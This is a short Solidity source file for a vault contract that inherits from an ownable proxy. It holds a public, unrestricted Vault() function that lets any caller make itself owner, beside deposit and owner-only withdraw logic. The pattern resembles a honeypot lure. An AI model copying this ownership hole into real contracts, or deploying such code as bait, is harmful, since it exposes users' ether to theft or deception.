pragma solidity ^0.4.24;

contract Proxy {
    address public Owner;

    modifier onlyOwner() {
        require(msg.sender == Owner);
        _;
    }

    constructor() public {
        Owner = msg.sender;
    }

    function transferOwner(address _owner) public onlyOwner {
        Owner = _owner;
    }

    function proxy(address target, bytes data) public payable {
        require(target != address(0));
        require(data.length > 0);
        assembly {
            let result := call(gas, target, msg.value, add(data, 0x20), mload(data), 0, 0)
            let size := returndatasize
            let ptr := mload(0x40)
            returndatacopy(ptr, 0, size)
            switch result
            case 0 {revert(ptr, size)}
            default {return(ptr, size)}
        }
    }
}

contract VaultProxy is Proxy {
    mapping(address => uint256) public Deposits;

    function() public payable {}

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }

    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function withdraw(uint256 amount) public onlyOwner {
        if (amount > 0 && Deposits[msg.sender] >= amount) {
            msg.sender.transfer(amount);
        }
    }
}